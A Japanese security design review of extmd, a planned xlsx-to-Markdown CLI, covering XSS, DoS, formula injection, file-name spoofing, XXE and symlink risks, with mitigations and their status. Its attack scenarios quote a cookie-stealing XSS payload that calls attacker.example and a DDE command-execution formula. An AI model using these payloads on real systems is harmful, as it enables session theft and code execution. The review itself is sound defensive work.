# セキュリティ設計レビュー: extmd

対象: [アーキテクチャ設計書](../design/architecture.md)、[CLI設計書](../design/cli.md)、
[domain](../design/domain/mod.md)・[reader](../design/reader/mod.md)・
[analysis](../design/analysis/mod.md)・[renderer](../design/renderer/mod.md)の各設計書
（`docs/design/` 配下全体）。[要件定義書](../requirement/requirements.md)も参照。

## 0. 前提・スコープ

**本レビューは実装（`src/`）が存在しない設計段階で実施したものであり、`docs/design/`
配下のMarkdown設計書に記載されたコードスニペット・処理フローの記述のみを根拠とする。**
実装フェーズで設計から逸脱する場合、本レビューの指摘は再検証が必要。

extmdは「ローカルファイルを読み込みローカルに書き出すだけの、ネットワーク通信を行わない
CLIツール」（[要件定義書6章](../requirement/requirements.md#6-非機能要件)）だが、
入力となる `.xlsx` は**社外から受け取った申請書・仕様書等（方眼紙Excel）を含みうる**
（[要件定義書2章](../requirement/requirements.md#2-背景課題)）。すなわち入力ファイルの
生成者と実行者が異なりうるケースが主要ユースケードに含まれる一方、設計書のどこにも
「入力`.xlsx`は信頼できない可能性がある」という脅威モデルの前提が明記されていない。
以下の指摘の多くは、この前提を設計書に明文化した上で評価し直すことを推奨する。

## サマリー

| # | 脆弱性の種類 | リスクレベル | 対象設計書 | 対応状況 |
|---|---|---|---|---|
| 1 | 出力Markdownへの生HTML混入によるストアド型インジェクション (Stored XSS相当) | Medium | [renderer/escape.md](../design/renderer/escape.md) | 反映済み |
| 2 | 入力ファイルサイズ・展開後セル数の上限なしによるリソース枯渇 (DoS) | Medium-High | [reader/xlsx.md](../design/reader/xlsx.md), [reader/grid_builder.md](../design/reader/grid_builder.md) | 反映済み（残存リスクは明記） |
| 3 | スプレッドシート再取込み時の数式インジェクション (CSV/Formula Injection) | Low | [renderer/escape.md](../design/renderer/escape.md), [renderer/table.md](../design/renderer/table.md) | 未対応（Low、別Issueで検討） |
| 4 | 出力ファイル名サニタイズが制御文字・Unicode方向操作文字を考慮していない | Low | [renderer/output.md](../design/renderer/output.md) | 未対応（Low、別Issueで検討） |
| 5 | XML/ZIPパーサ依存によるサプライチェーンリスク（XXE・zip bomb耐性が未検証） | Medium | [reader/mod.md](../design/reader/mod.md) | 反映済み（CI監査は未着手） |
| 6 | エラーメッセージによる内部情報の断片的な漏洩 | Low | [cli.md 5章](../design/cli.md#5-エラーハンドリングと終了コード) | 未対応（Low、別Issueで検討） |
| 7 | `--clean`・書き込み処理のシンボリックリンク追従 | Low | [cli.md 3.2節](../design/cli.md#32-outputtarget-の構築とタイムスタンプクリーンアップ), [renderer/output.md](../design/renderer/output.md) | 未対応（Low、別Issueで検討） |

Medium/Medium-High（1・2・5）は[Issue #14](https://github.com/MinamiyamaKotaro/extmd/issues/14)での検討を経て設計書に反映済み。Low評価の4件（3・4・6・7）はIssue #14のスコープ外としており、対応する場合は別途Issueを起票する。

---

## 1. 出力Markdownへの生HTML混入によるストアド型インジェクション

**リスクレベル: Medium**

### 詳細

[renderer/escape.md](../design/renderer/escape.md)の`escape_table_cell`/`escape_flow_text`は、
Markdown記法と衝突する文字（`\ * _ \` [ ] #` ・パイプ・改行）のみをエスケープし、
HTMLの特殊文字（`<` `>` `&`）は一切変換しない設計になっている。

```rust
// escape.md 2章・3章
fn escape_table_cell(text: &str) -> String {
    text.replace('\\', "\\\\").replace('|', "\\|").replace('\n', "<br>")
}
fn escape_flow_text(text: &str) -> String {
    // '\\' '*' '_' '`' '[' ']' '#' のみエスケープ
}
```

CommonMark/GFMをはじめ多くのMarkdown実装は、素通しした生HTMLタグをそのまま
埋め込みHTMLとしてレンダリングする（サニタイズは処理系依存）。セル値に
`<img src=x onerror=...>` や `<script>` のような文字列が含まれる`.xlsx`を変換すると、
生成された`.md`をそのままレンダリングするビューア（社内Wiki、静的サイトジェネレータ、
サニタイズを行わないMarkdownプレビュー等）で任意のHTML/JSが実行されうる
（OWASP Top 10 A03:2021-Injection相当）。

### 攻撃シナリオ

1. 攻撃者が、申請書を装った方眼紙Excel（`.xlsx`）のセルに
   `<img src=x onerror=fetch('https://attacker.example/'+document.cookie)>` を仕込み、
   業務担当者にメール等で送付する。
2. 業務担当者がextmdでこのファイルを`.md`に変換し、そのまま社内Wikiや
   ドキュメント公開基盤（生HTMLをサニタイズせずレンダリングする構成）にアップロードする。
3. 当該ページを閲覧した第三者のブラウザで注入されたスクリプトが実行され、
   Cookie窃取やページ改ざん等が発生する。

### 推奨対策（セキュアバイデザイン）

- `escape_table_cell`/`escape_flow_text`に `<` → `&lt;`、`>` → `&gt;`、
  `&` → `&amp;` のHTMLエンティティ変換を追加する（Markdown中に生HTMLとして
  解釈される経路自体を塞ぐ）。既存のMarkdown制御文字エスケープと同様の
  「置換順序（`&`を最初に変換しないと二重エスケープになる）」に注意する。
- HTMLエスケープを行わない設計を維持する場合は、README・要件定義書に
  「出力Markdownは生HTMLを含みうるため、信頼できない入力ファイルを変換した
  `.md`を、HTMLサニタイズを行わない環境でレンダリングしない」という
  利用上の注意を明記する。
- [renderer/escape.md 5章「未確定事項」](../design/renderer/escape.md#5-未確定事項)に、
  エスケープ対象文字セットの検討項目としてHTML特殊文字を追加することを推奨する。

**対応状況**: [Issue #14](https://github.com/MinamiyamaKotaro/extmd/issues/14)での検討を経て、
[renderer/escape.md 2〜4章](../design/renderer/escape.md#2-escape_table_cell)に
`&` `<` `>` のエスケープ（置換順序含む）を反映済み。

---

## 2. 入力ファイルサイズ・展開後セル数の上限なしによるリソース枯渇 (DoS)

**リスクレベル: Medium-High**

### 詳細

- `.xlsx`はZIPコンテナ形式であり、[reader/mod.md 4章](../design/reader/mod.md#4-使用ライブラリの決定-umya-spreadsheet)
  が採用する`umya-spreadsheet`はEagerパース（ファイル全体を一括読み込み）を行う設計。
  入力ファイルサイズや展開後サイズの上限チェックは設計書のどこにも存在しない。
- [reader/grid_builder.md 6章](../design/reader/grid_builder.md#6-計算量メモリ使用量に関する留意点)は
  「`rows * cols` 件の`domain::Cell`を常に確保する」設計を明記した上で、
  「極端に疎な巨大シート（例: `(1, 1)`と`(100000, 100000)`にだけ値がある等）は
  現実的なユースケースとして想定しないため、上限チェック等は行わない」と**意図的に
  対策を見送っている**。しかし`highest_column_and_row()`はシートのメタデータ上の
  最大座標を返すだけであり、実データが1セルしかなくても`highest_row`/`highest_col`
  を巨大な値に細工した`.xlsx`を作成することは攻撃者にとって容易である。
- [reader/xlsx.md 5章](../design/reader/xlsx.md#5-未確定事項)でも「数千シート規模の
  ワークブックに対する処理時間」が未検証の未確定事項として残されている。

### 攻撃シナリオ

1. 攻撃者が、実データはごく少量だが、シートの`highest_column_and_row`のみを
   `(100000, 100000)`相当に細工した`.xlsx`（正規のOfficeツールでは通常発生しないが、
   xlsxはXML+ZIPの組み合わせであるため直接編集で容易に作成できる）を用意する。
2. 業務担当者が、受け取った添付ファイルをextmdで変換しようとすると、
   `grid_builder::build_grid`が`rows * cols`（100000 × 100000 = 100億）件の
   `domain::Cell`を確保しようとし、メモリ枯渇・プロセスクラッシュ・PCの応答不能を
   引き起こす（Uncontrolled Resource Consumption, CWE-400）。
3. 同様に、圧縮率の高いZIPボム的な`.xlsx`（小さい圧縮サイズ・巨大な展開後XML）を
   用いてumya-spreadsheet内部のXMLパース段階でメモリ・CPUを消費させることも考えられる
   （3章参照）。

### 推奨対策（セキュアバイデザイン）

- [要件定義書6章「非機能要件」](../requirement/requirements.md#6-非機能要件)に
  「悪意ある/破損した入力ファイルに対する耐性（サイズ上限・タイムアウト）」を
  非機能要件として明記する。
- `reader::xlsx::read_sheets`の入口、または`grid_builder::build_grid`の直前で、
  `rows * cols`が一定の上限（例: 要件定義書が想定する「数千〜数万セル規模」に
  余裕を持たせた値、例えば数百万セル）を超える場合は`ReaderError`の新しいバリアント
  （例: `ReaderError::SheetTooLarge`）で明示的に拒否する設計を追加する。
- 入力ファイル自体のサイズ上限（例: 100MB等）をCLI起動時にチェックし、
  超過時は`ConvertError`で早期に拒否する。
- これらの上限値はハードコードせず、[analysis/registry.md](../design/analysis/registry.md)の
  `StrategyConfig`と同様に将来的に調整可能な形にすることを検討する。

**対応状況**: [Issue #14](https://github.com/MinamiyamaKotaro/extmd/issues/14)での検討を経て、
[reader/mod.md 5章](../design/reader/mod.md#5-readererror-と公開api)に`ReaderError::SheetTooLarge`、
[reader/xlsx.md 3章](../design/reader/xlsx.md#3-列数0のシートの扱い)に`max_cells`超過時の
早期拒否、[cli.md](../design/cli.md)に`--max-cells`オプションを反映済み。ただしZIP展開・
XMLパース段階そのもの（`max_cells`チェックに到達する前）のリソース枯渇は、
現行ライブラリ構成では完全には防げない残存リスクとして
[reader/mod.md 4.1章](../design/reader/mod.md#41-依存ライブラリのセキュリティ検証と監査方針)に
明記した（3章のZIPボム関連の指摘も参照）。

---

## 3. スプレッドシート再取込み時の数式インジェクション (CSV/Formula Injection)

**リスクレベル: Low**

### 詳細

[renderer/table.md](../design/renderer/table.md)が生成するMarkdownパイプテーブルのセル値は、
[renderer/escape.md](../design/renderer/escape.md)でMarkdown記法のみエスケープされる。
セル値の先頭が `=` `+` `-` `@` で始まる場合（例: 元のExcelファイルで数式が
文字列として、あるいは計算結果が偶然これらの文字で始まる値として入っていたケース）でも、
そのまま出力される。

出力された`.md`のテーブルを人間がコピーして別のExcel/Google Sheetsに貼り付け直す
運用は起こりうるため、貼り付け先のスプレッドシートソフトがセル内容を数式として
再解釈し、意図しない外部参照・スクリプト実行（DDE経由のコマンド実行等、環境による）
につながる可能性がある（CWE-1236 CSV Injection相当。ただし出力形式がCSVではなく
Markdownテーブルであるため、実際に悪用可能かは貼り付け方法・ソフトウェア依存で
リスクは低い）。

### 攻撃シナリオ

1. 攻撃者が方眼紙Excelの表セルに `=HYPERLINK("http://attacker.example","click")` や
   `=cmd|'/c calc'!A1` のような文字列を仕込んだ`.xlsx`を送付する。
2. 変換後の`.md`テーブルを業務担当者が別のスプレッドシートに転記・貼り付けした際、
   貼り付け先ソフトウェアの設定次第で数式として評価されてしまう。

### 推奨対策（セキュアバイデザイン）

- 優先度は低いが、`escape_table_cell`/`escape_flow_text`のセル値が
  `= + - @` で始まる場合に先頭へゼロ幅文字やシングルクォートを付与しない
  （Markdown表示が崩れるため）代わりに、[要件定義書8章「未確定事項」](../requirement/requirements.md)
  または[renderer/escape.md 5章](../design/renderer/escape.md#5-未確定事項)に
  「既知の制約」として記載し、readmeで「変換結果を再度スプレッドシートに
  貼り付ける場合は数式解釈に注意する」旨を注記することを推奨する。

---

## 4. 出力ファイル名サニタイズが制御文字・Unicode方向操作文字を考慮していない

**リスクレベル: Low**

### 詳細

[renderer/output.md 3章](../design/renderer/output.md#3-ファイル名サニタイズsplitdirectory時)の
`sanitize_base_name`は、Windows禁止文字（`\ / : * ? " < > |`）・末尾のピリオド/空白・
予約デバイス名は考慮しているが、以下は考慮されていない。

- C0制御文字（`U+0000`〜`U+001F`、NULバイトを含む）
- Unicode双方向制御文字（例: `U+202E RIGHT-TO-LEFT OVERRIDE`）。ファイル名の見た目を
  偽装する目的（例: 拡張子偽装）で悪用される既知の手法（CWE-838寄り）。

シート名は`.xlsx`の作成者（攻撃者になりうる）が完全に制御できる文字列であり、
`--split`出力時にそのままファイル名の一部として使われる。

### 攻撃シナリオ

1. 攻撃者が、シート名に`U+202E`を含む文字列（例: 表示上は無害に見えるが、
   実体は拡張子を偽装する並び）を仕込んだ`.xlsx`を送付する。
2. `--split`で変換した際に生成される`.md`ファイル名が、ファイルマネージャ上で
   意図と異なる表示になり、利用者を誤認させる社会工学的リスクがある。
   （直接のコード実行にはつながらないためリスクは低いが、ファイル名衝突回避
   ロジック[4章](../design/renderer/output.md#4-同一実行内でのファイル名衝突回避)の
   「大文字小文字を区別しない比較」と合わせて、意図しないファイル上書きを
   誘発する可能性もゼロではない。）

### 推奨対策（セキュアバイデザイン）

- `sanitize_base_name`で、Unicode一般カテゴリが制御文字（Cc）・書式文字（Cf、
  双方向制御文字を含む）に該当する文字も`_`に置換するか除去する処理を追加する。
- [renderer/output.md 7章「未確定事項」](../design/renderer/output.md#7-未確定事項)に
  検討項目として追記することを推奨する。

---

## 5. XML/ZIPパーサ依存によるサプライチェーンリスク

**リスクレベル: Medium（要検証）**

### 詳細

`.xlsx`はOOXML（ZIP + XML群）形式であり、`umya-spreadsheet`は内部でXMLパーサ・ZIP展開
ライブラリに依存する。歴史的にXMLパーサはXXE（XML External Entity）攻撃や
再帰的エンティティ展開（Billion Laughs攻撃）の対象になりやすく、ZIP展開ライブラリは
Zip Slip（展開先パストラバーサル、本ツールでは直接該当しない可能性が高いが依存先の
実装次第）やzip bombの影響を受けうる。

設計書には`umya-spreadsheet`および、その依存する具体的なXML/ZIP実装クレートが
これらへの対策（外部エンティティ解決の無効化、展開後サイズの上限等）を内部で
講じているかどうかの検証記録がない（[reader/mod.md 4章](../design/reader/mod.md#4-使用ライブラリの決定-umya-spreadsheet)は
機能面の採用理由のみを記載）。

### 攻撃シナリオ

1. 攻撃者が、`.xlsx`内のXMLパートにXXEペイロードや再帰エンティティ定義を仕込んだ
   ファイル、またはZIPボム構造の`.xlsx`を送付する。
2. `umya-spreadsheet`または依存クレートがこれらに対して脆弱な場合、
   ローカルファイル読み取り（XXE）やリソース枯渇（Billion Laughs/zip bomb）が
   `extmd`のプロセス権限で発生する。

### 推奨対策（セキュアバイデザイン）

- 実装フェーズ着手前に、`umya-spreadsheet`が依存するXMLパーサ（例: `quick-xml`等）が
  デフォルトで外部エンティティ解決を無効化しているか、ZIP展開に対して
  サイズ上限を設けているかを確認し、確認結果を本ドキュメントまたは
  [reader/mod.md](../design/reader/mod.md)に追記する。
- CI/CDに `cargo audit`（既知CVEの継続監視）・`cargo deny`（ライセンス/アドバイザリ
  チェック）の導入を検討し、依存クレートの脆弱性を継続的に監視する体制を
  [README](../../README.md)のディレクトリ構成/開発フロー、またはCI設計に明記する
  （現時点でCI設計書が存在しないため、CLI設計書または別途CI設計書での
  記載を推奨）。
- 依存クレートのバージョンアップ方針（Dependabot等）についても同様に明記を推奨する。

**対応状況**: [Issue #14](https://github.com/MinamiyamaKotaro/extmd/issues/14)での検討を経て、
`umya-spreadsheet`の実依存（`quick-xml`/`zip`クレート、実ソースコードで確認済み）を踏まえ、
[reader/mod.md 4.1章](../design/reader/mod.md#41-依存ライブラリのセキュリティ検証と監査方針)に
XXE耐性の根拠（推論である旨を明示）とZip Bombに対する残存リスク・多層防御方針を反映済み。
`cargo audit`/`cargo deny`のCI導入は引き続き未着手であり、実装フェーズでのCI設計時に
別途対応が必要。

---

## 6. エラーメッセージによる内部情報の断片的な漏洩

**リスクレベル: Low**

### 詳細

[cli.md 5.2節](../design/cli.md#52-変換プロセス実行時のエラー-converterror)は、
`ConvertError::Reader(err)`のDisplay実装で`umya-spreadsheet`側のエラー文字列を
そのまま透過的にユーザーへ出力する設計になっている。

```rust
ConvertError::Reader(e) => write!(f, "Error: Failed to read Excel file: {}", e),
```

ローカルCLIとして単独で使う分にはリスクは軽微だが、内部ライブラリのエラー文字列には
実装詳細（内部のファイルパス表現、パーサの内部構造など）が含まれる可能性があり、
これをそのまま外部に見せる設計は「エラーメッセージは原因特定のために必要な情報のみに
絞る」というセキュア設計の原則からはやや外れる。将来、extmdの変換処理をラップした
サーバーサイド/Webサービス（例: アップロードされた`.xlsx`をバッチ変換するAPI）が
構築された場合、このエラーメッセージがそのままレスポンスに転用されると
内部情報漏洩（OWASP A05:2021-Security Misconfiguration寄り）につながりうる。

### 推奨対策（セキュアバイデザイン）

- v1（ローカルCLI限定）の現設計自体は許容範囲だが、[要件定義書](../requirement/requirements.md)
  または[cli.md](../design/cli.md)に「本ツールはローカルCLIとしての利用のみを想定し、
  エラーメッセージをそのまま外部（Web API等）に転用しないこと」を利用上の注意として
  明記しておくことを推奨する。将来的にサーバーサイド用途を検討する場合は、
  内部エラーの詳細はログにのみ出力し、利用者向けメッセージは定型化する設計へ
  切り替える必要がある。

---

## 7. `--clean`・書き込み処理のシンボリックリンク追従

**リスクレベル: Low**

### 詳細

[cli.md 3.2節](../design/cli.md#32-outputtarget-の構築とタイムスタンプクリーンアップ)の
`--clean`実装は、出力先ディレクトリ全体の削除（`remove_dir_all`）を避け、
直下の`.md`ファイルのみを`std::fs::remove_file`で削除する設計であり、これは
**適切なセキュア設計判断として評価できる**（8章参照）。

一方で、`std::fs::remove_file`・[renderer/output.md](../design/renderer/output.md)の
`std::fs::write`はいずれもデフォルトでシンボリックリンクを辿る。出力先ディレクトリが
複数ユーザーで共有される環境（例: 共有NAS上の作業ディレクトリ）で、第三者が
事前に`report.md`という名前のシンボリックリンクを別の重要ファイルへ向けて
配置していた場合、意図しない上書き（`write_single_file`/`write_split`）や
削除（`--clean`）が発生する可能性がある。影響を受けるには「攻撃者が出力先
ディレクトリに書き込み権限を持つ」という前提が必要なため、実際の悪用条件は限定的。

### 推奨対策（セキュアバイデザイン）

- 優先度は低いが、共有ディレクトリでの利用を想定する場合は、削除対象の
  ファイルが通常ファイルであることを`std::fs::symlink_metadata`で確認し
  シンボリックリンクを除外する対策を検討する。
- v1では[renderer/output.md 7章](../design/renderer/output.md#7-未確定事項)の
  未確定事項として記録するに留め、実装フェーズでの優先度は低く設定してよい。

---

## 8. 妥当と評価できる既存の設計判断

以下は今回のレビューで確認した中で、セキュリティの観点からも妥当と判断できる設計判断であり、
実装フェーズで後退させないよう明記しておく。

- **`--clean`が`remove_dir_all`ではなく拡張子限定の個別削除**
  （[cli.md 3.2節](../design/cli.md#32-outputtarget-の構築とタイムスタンプクリーンアップ)）:
  誤って重要なディレクトリ（`/`や`docs/`等）を指定した場合の全削除リスクを
  意図的に回避しており、破壊的操作に対する防御的設計として妥当。
- **出力先ディレクトリの自動クリーンアップを行わないデフォルト方針**
  （[renderer/output.md 5章](../design/renderer/output.md#5-既存ファイル残骸ファイルの扱いoption-c)）:
  無関係な既存ファイルを一括削除する致命的リスクを避けており、オプトイン
  （`--clean`）方式は妥当。
- **全ログをstderrに出力し、stdoutへのリダイレクト時にMarkdown本文へログが
  混入しない設計**（[cli.md 4章](../design/cli.md#4-ロギング方針)）:
  出力の完全性を保つ設計として妥当（ログインジェクションによる出力破損の防止）。
- **ファイル名サニタイズでWindows禁止文字・予約デバイス名・末尾ピリオド/空白を
  個別に考慮**（[renderer/output.md 3章](../design/renderer/output.md#3-ファイル名サニタイズsplitdirectory時)）:
  クロスプラットフォームでの安全なファイル名生成を丁寧に設計しており妥当
  （4章の指摘は追加の強化提案であり、既存設計を否定するものではない）。
- **数式そのものを扱わず、常に計算済みキャッシュ値のみを参照する方針**
  （[reader/cell_mapper.md 2章](../design/reader/cell_mapper.md#2-値の変換数式セルの解決方針を含む)）:
  数式評価エンジンを自前実装しないため、数式経由の外部参照・危険な関数呼び出し
  （例: `WEBSERVICE`関数等によるSSRF類似のリスク）を構造的に回避できており妥当。

---

## 9. 実装フェーズへの申し送り事項

- 上記1・2・4は実装時に対応するコード（`escape.rs`/`xlsx.rs`・`grid_builder.rs`/`output.rs`）
  のテストケースとして明示的にネガティブテスト（悪意あるセル値・巨大座標・制御文字を
  含むシート名）を追加することを推奨する。
- 上記5は実装着手前の依存クレート選定確認事項として、`umya-spreadsheet`採用の
  最終確認時にあわせて実施することを推奨する。
- 本レビューは設計書ベースであり実コードを検証していないため、実装完了後に
  `docs/security/`配下で実装ベースの追補レビュー（`/security-specialist`等を用いた
  コードレベルの脆弱性スキャン）を別途実施することを推奨する。
